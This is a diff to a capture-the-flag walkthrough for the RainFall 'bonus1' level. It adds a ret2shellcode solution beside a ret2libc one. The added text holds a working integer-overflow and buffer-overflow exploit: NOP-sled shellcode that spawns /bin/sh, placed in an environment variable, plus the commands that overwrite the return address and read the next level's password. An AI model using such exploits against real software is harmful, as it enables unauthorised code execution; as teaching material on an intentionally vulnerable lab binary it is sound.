@@ -86,7 +86,7 @@ memcpy(0xbffff704, "TEST", 44) = 0xbffff704
 As we can see, `atoi` returns `0x8000000b` which is 11 in decimal (if we ignore the 8). Furthermore, `memcpy` copies 44 bytes to the buffer, which means we can write over `ret`.
 > We can also provide more bytes than is allocated for the stack, which would allow us to write over the return address. We'll see this in the ret2libc section.
 
-There's different ways to solve this challenge, we'll see two of them. First the intended way with writing over the int and then the ret2libc way.
+There's different ways to solve this challenge, we'll see two of them. First the intended way with writing over the int then the ret2libc way and finally the ret2shellcode way.
 
 ### Write over the int
 As mentionned above, we can write over the `ret` variable with the following:
@@ -177,6 +177,53 @@ number + padding + address of system + address of exit + address of "/bin/sh"
 Let's run it:
 ```bash
 ./bonus1 -2147483631 `python -c 'print("A"*56 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
+
+Perfect, let's move to the other solution.
+
+### Ret2shellcode
+Check the [level1's walkthrough](../level1/walkthrough.md#ret2shellcode) for an explanation of the ret2shellcode technique.
+
+Since we already have our padding, we need a number that will allow us to write 56 bytes to reach the return address and then the addresse our shellcode. So a total of 60 bytes (56 + 4):
+```bash
+❯ ./a.out -2147483633
+-8589934532 vs 60
+```
+
+We can either feed our shellcode to the program, or we can put the shellcode in an environment variable. For convenience, we'll use the environment variable:
+```bash
+bonus1@RainFall:~$ export EXPLOIT=`python -c "print '\x90' * 200 + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
+```
+
+We'll write and run a C program to find the address of the environment variable:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    printf("%p\n", getenv("EXPLOIT"));
+    return 0;
+}
+```
+
+```bash
+bonus0@RainFall:/tmp$ ./a.out
+0xbffff848
+```
+
+Alright, let's craft our payload:
+```
+number + padding + address of shellcode in the env
+
+-2147483633 + 56 * A  + "\xbf\xff\xf8\x48"
+```
+
+Let's run it:
+```bash
+bonus1@RainFall:~$ ./bonus1 -2147483633 `python -c 'print("A"*56 + "\xbf\xff\xf8\x48"[::-1])'`
 $ cat /home/user/bonus2/.pass
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
 ```
